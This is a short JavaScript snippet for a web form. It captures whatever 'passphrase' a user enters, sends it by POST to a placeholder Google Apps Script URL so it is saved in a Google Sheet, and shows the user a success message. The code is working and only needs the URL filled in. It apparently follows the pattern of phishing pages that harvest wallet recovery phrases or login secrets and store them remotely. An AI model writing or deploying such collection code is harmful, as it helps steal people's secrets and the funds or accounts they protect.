document.getElementById('passphraseForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const passphrase = document.getElementById('passphrase').value;

    // Save the passphrase to Google Sheets
    savePassphrase(passphrase);

    // Show success message
    document.getElementById('successMessage').classList.remove('hidden');
});

function savePassphrase(passphrase) {
    const url = 'YOUR_GOOGLE_APPS_SCRIPT_URL'; // Replace with your Web app URL

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ passphrase: passphrase }),
    })
    .then(response => response.text())
    .then(data => {
        console.log('Passphrase saved successfully:', data);
    })
    .catch(error => {
        console.error('Error saving passphrase:', error);
    });
}
